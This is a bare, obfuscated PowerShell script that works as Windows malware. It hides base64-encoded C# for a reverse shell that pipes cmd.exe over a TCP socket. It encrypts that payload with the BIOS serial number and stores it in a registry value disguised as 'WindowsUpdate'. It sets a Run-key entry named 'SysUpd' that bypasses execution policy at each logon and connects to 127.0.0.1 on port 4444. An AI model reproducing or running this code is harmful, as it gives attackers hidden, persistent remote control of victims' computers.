$k=(gwmi win32_bios).serialnumber.trim();$kb=[Text.Encoding]::UTF8.GetBytes($k);$s=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLk5ldC5Tb2NrZXRzOw0KdXNpbmcgU3lzdGVtLkRpYWdub3N0aWNzOw0KdXNpbmcgU3lzdGVtLklPOw0KdXNpbmcgU3lzdGVtLlRocmVhZGluZzsNCg0KcHVibGljIGNsYXNzIENfYWhwT2lTDQp7DQogICAgcHVibGljIHN0YXRpYyB2b2lkIFN0YXJ0KHN0cmluZyBQX01KeW1DTSwgaW50IFBfUGdVbXpyKQ0KICAgIHsNCiAgICAgICAgd2hpbGUgKHRydWUpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHVzaW5nIChUY3BDbGllbnQgVl9hbXltTXEgPSBuZXcgVGNwQ2xpZW50KFBfTUp5bUNNLCBQX1BnVW16cikpDQogICAgICAgICAgICAgICAgdXNpbmcgKFN0cmVhbSBWX1VSUENUSSA9IFZfYW15bU1xLkdldFN0cmVhbSgpKQ0KICAgICAgICAgICAgICAgIHVzaW5nIChTdHJlYW1SZWFkZXIgVl91VXFQV2ggPSBuZXcgU3RyZWFtUmVhZGVyKFZfVVJQQ1RJKSkNCiAgICAgICAgICAgICAgICB1c2luZyAoU3RyZWFtV3JpdGVyIFZfZk9FTkdxID0gbmV3IFN0cmVhbVdyaXRlcihWX1VSUENUSSkpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBWX2ZPRU5HcS5BdXRvRmx1c2ggPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICBQcm9jZXNzIFZfRlhmU2NHID0gbmV3IFByb2Nlc3MoKTsNCiAgICAgICAgICAgICAgICAgICAgVl9GWGZTY0cuU3RhcnRJbmZvLkZpbGVOYW1lID0gTV9tZ2JrZigiWTIwPSIpICsgTV9tZ2JrZigiWkM0PSIpICsgTV9tZ2JrZigiWlhobCIpOw0KICAgICAgICAgICAgICAgICAgICBWX0ZYZlNjRy5TdGFydEluZm8uUmVkaXJlY3RTdGFuZGFyZElucHV0ID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgVl9GWGZTY0cuU3RhcnRJbmZvLlJlZGlyZWN0U3RhbmRhcmRPdXRwdXQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICBWX0ZYZlNjRy5TdGFydEluZm8uUmVkaXJlY3RTdGFuZGFyZEVycm9yID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgVl9GWGZTY0cuU3RhcnRJbmZvLlVzZVNoZWxsRXhlY3V0ZSA9IGZhbHNlOw0KICAgICAgICAgICAgICAgICAgICBWX0ZYZlNjRy5TdGFydEluZm8uQ3JlYXRlTm9XaW5kb3cgPSB0cnVlOw0KDQogICAgICAgICAgICAgICAgICAgIFZfRlhmU2NHLk91dHB1dERhdGFSZWNlaXZlZCArPSAoUF9FcFJLZWssIFBfcEFKSmhNKSA9Pg0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoUF9wQUpKaE0uRGF0YSAhPSBudWxsKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFZfZk9FTkdxLldyaXRlTGluZShQX3BBSkpoTS5EYXRhKTsNCiAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgICAgVl9GWGZTY0cuRXJyb3JEYXRhUmVjZWl2ZWQgKz0gKFBfTnNGZlFiLCBQX3BBSkpoTSkgPT4NCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKFBfcEFKSmhNLkRhdGEgIT0gbnVsbCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBWX2ZPRU5HcS5Xcml0ZUxpbmUoUF9wQUpKaE0uRGF0YSk7DQogICAgICAgICAgICAgICAgICAgIH07DQoNCiAgICAgICAgICAgICAgICAgICAgVl9GWGZTY0cuU3RhcnQoKTsNCiAgICAgICAgICAgICAgICAgICAgVl9GWGZTY0cuQmVnaW5PdXRwdXRSZWFkTGluZSgpOw0KICAgICAgICAgICAgICAgICAgICBWX0ZYZlNjRy5CZWdpbkVycm9yUmVhZExpbmUoKTsNCg0KICAgICAgICAgICAgICAgICAgICBzdHJpbmcgVl9IQ2tYaFE7DQogICAgICAgICAgICAgICAgICAgIHdoaWxlICgoVl9IQ2tYaFEgPSBWX3VVcVBXaC5SZWFkTGluZSgpKSAhPSBudWxsKQ0KICAgICAgICAgICAgICAgICAgICAgICAgVl9GWGZTY0cuU3RhbmRhcmRJbnB1dC5Xcml0ZUxpbmUoVl9IQ2tYaFEpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoIChFeGNlcHRpb24pDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgVGhyZWFkLlNsZWVwKDUwMDApOyAvLyB3YWl0IDUgc2Vjb25kcyBiZWZvcmUgcmV0cnkNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIHByaXZhdGUgc3RhdGljIHN0cmluZyBNX21nYmtmKHN0cmluZyBWX2hvbWZ0KQ0KICAgIHsNCiAgICAgICAgaWYgKHN0cmluZy5Jc051bGxPckVtcHR5KFZfaG9tZnQpKQ0KICAgICAgICAgICAgcmV0dXJuIHN0cmluZy5FbXB0eTsNCiAgICAgICAgYnl0ZVtdIFZfeGtncGQgPSBDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoVl9ob21mdCk7DQogICAgICAgIHJldHVybiBTeXN0ZW0uVGV4dC5FbmNvZGluZy5VVEY4LkdldFN0cmluZyhWX3hrZ3BkKTsNCiAgICB9DQp9'));$b=[Text.Encoding]::UTF8.GetBytes($s);for($i=0;$i-lt$b.Length;$i++){$b[$i]=$b[$i]-bxor$kb[$i%$kb.Length]};ni HKCU:\Software\WindowsUpdate -Force;sp HKCU:\Software\WindowsUpdate DataCache ([Convert]::ToBase64String($b));$stub='$k=(gwmi win32_bios).serialnumber.trim();$e=(gp HKCU:\Software\WindowsUpdate).DataCache;$b=[Convert]::FromBase64String($e);$p=[Text.Encoding]::UTF8.GetBytes($k);for($i=0;$i-lt$b.Length;$i++){$b[$i]=$b[$i]-bxor$p[$i%$p.Length]};Add-Type -TypeDefinition([Text.Encoding]::UTF8.GetString($b)) -Language CSharp;[C_ahpOiS]::Start("127.0.0.1",4444)';$enc=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($stub));sp HKCU:\Software\Microsoft\Windows\CurrentVersion\Run SysUpd "powershell -NoP -EP Bypass -Enc $enc"
